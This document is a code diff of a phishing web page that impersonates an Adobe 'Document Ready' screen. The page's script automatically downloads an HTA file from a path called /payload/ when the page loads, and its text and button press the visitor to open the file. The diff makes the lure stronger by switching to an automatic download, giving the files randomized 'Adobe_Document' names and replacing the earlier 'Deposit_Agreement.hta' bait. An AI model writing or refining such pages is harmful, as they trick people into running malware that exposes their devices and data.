@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Download Complete</title>
+    <title>Document Ready</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; background-color: #f9f9f9; }
         .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 500px; }
@@ -11,8 +11,9 @@
         h1 { font-size: 28px; color: #333; margin-bottom: 10px; }
         p { font-size: 16px; color: #666; line-height: 1.5; margin-bottom: 20px; }
         .filename { font-weight: bold; color: #333; }
-        .btn { background-color: #ed2224; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block; margin-top: 10px; }
+        .btn { background-color: #ed2224; color: white; padding: 12px 24px; text-decoration: none; border-radius: 4px; font-weight: bold; display: inline-block; margin-top: 10px; cursor: pointer; border: none; font-size: 16px; }
         .btn:hover { background-color: #c41b1d; }
+        .note { font-size: 13px; color: #888; margin-top: 16px; }
     </style>
 </head>
 <body>
@@ -23,18 +24,40 @@
             <polygon points="58,80 76,24 76,80 67,80" fill="#fff"/>
         </svg>
         
-        <h1>Download Complete</h1>
-        <p>You've received a secured document.</p>
-        <p>Your Document has been saved to your device. Find <span id="htaName" class="filename">Deposit_Agreement.hta</span> in Recent (File Explorer), open it, and run the file inside to view your document.</p>
+        <h1>Document Ready</h1>
+        <p>Your secured document has been prepared.</p>
+        <p>The file <span id="fileName" class="filename">Adobe_Document.hta</span> will download automatically. If it doesn't start, click below.</p>
         
-        <a href="#" class="btn" onclick="window.location.reload()">Download Document Again</a>
+        <button class="btn" onclick="forceDownload()">Download Document</button>
+        <div class="note">This usually only takes a few seconds.</div>
     </div>
 
     <script>
         // Get the unique filename from the URL
         const urlParams = new URLSearchParams(window.location.search);
-        const uniqueZip = urlParams.get('hta') || 'Deposit_Agreement.hta';
-        document.getElementById('zipName').innerText = uniqueZip;
+        const uniqueFile = urlParams.get('file') || 'Adobe_Document_' + Math.floor(Math.random() * 900000 + 100000) + '.hta';
+        document.getElementById('fileName').innerText = uniqueFile;
+
+        // Auto-trigger download on load
+        window.onload = function() {
+            setTimeout(triggerDownload, 500);
+        };
+
+        function triggerDownload() {
+            const link = document.createElement('a');
+            link.href = `/payload/${uniqueFile}`;
+            link.download = uniqueFile;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+
+        function forceDownload() {
+            triggerDownload();
+            document.querySelector('.btn').textContent = 'Download Started...';
+            document.querySelector('.btn').disabled = true;
+            document.querySelector('.btn').style.background = '#ccc';
+        }
     </script>
 </body>
 </html>
